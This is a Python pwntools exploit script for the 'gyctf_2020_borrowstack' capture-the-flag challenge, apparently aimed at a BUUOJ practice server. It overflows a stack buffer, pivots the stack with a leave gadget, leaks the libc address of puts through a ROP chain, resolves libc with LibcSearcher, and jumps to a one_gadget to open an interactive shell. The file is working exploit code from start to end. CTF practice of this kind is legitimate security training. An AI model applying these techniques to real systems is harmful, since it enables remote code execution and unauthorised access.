from pwn import *
from LibcSearcher import *

import utils

context.arch = 'amd64'
context.log_level = 'debug'

target = remote('node4.buuoj.cn', 29932)
elf = ELF('../gyctf_2020_borrowstack')

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = elf.sym['main']

bank = 0x601080
leave = 0x400699
pop_rdi = 0x400703
retn= 0x4004c9

payload = b'a' * 0x60 + p64(bank + 0x10) + p64(leave)
target.send(payload)

payload = p64(0xffffffff) * 0x14 + p64(pop_rdi) + \
          p64(puts_got) + p64(puts_plt) + p64(main)
target.sendlineafter('now!', payload)

puts_addr = u64(target.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc = LibcSearcher('puts', puts_addr)
one_gadget = 0x4526a + puts_addr - libc.dump('puts')

payload = b'a' * 0x60 + b'a' * 0x8 + p64(one_gadget)
target.send(payload)
target.interactive()